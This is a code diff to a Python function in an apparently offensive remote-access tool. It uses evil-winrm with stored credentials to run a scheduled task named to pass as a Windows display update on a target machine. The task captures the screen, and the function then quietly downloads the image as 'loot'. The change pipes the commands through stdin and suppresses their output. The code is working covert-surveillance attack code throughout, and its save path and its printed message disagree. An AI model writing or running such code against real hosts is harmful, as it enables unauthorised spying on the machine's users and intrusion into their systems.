@@ -99,26 +99,31 @@ def screenshot(target_ip):
         TASK_NAME = "WindowsDisplayUpdate"
         REMOTE_FILE = "C:\\Users\\Public\\screen.png"
         LOCAL_DIR = "./Box"
-        cmd = [
-            "evil-winrm",
-            "-i", target_ip,
-            "-u", USERNAME,
-            "-p", PASSWORD,
-            "-c", f'schtasks /run /tn "{TASK_NAME}"'
-        ]
-        subprocess.run(cmd, stdout=subprocess.DEVNULL)
+        payload = 'schtasks /run /tn "WindowsDisplayUpdate"\nexit\n'
+
+        subprocess.run(
+            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
+            input=payload,
+            text=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+
 
         time.sleep(3)  # give task time to write file
 
         print("[*] Downloading screenshot...")
-        cmd = [
-            "evil-winrm",
-            "-i", target_ip,
-            "-u", USERNAME,
-            "-p", PASSWORD,
-            "-c", f'download {REMOTE_FILE} {LOCAL_DIR}'
-        ]
-        subprocess.run(cmd)
+        
+        payload = f'download {REMOTE_FILE} {LOCAL_DIR}'
+        
+        subprocess.run(
+            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
+            input=payload,
+            text=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+
         print("[+] Screenshot saved to ./loot/")
     except:
         print("[-] Failed to save screenshot")
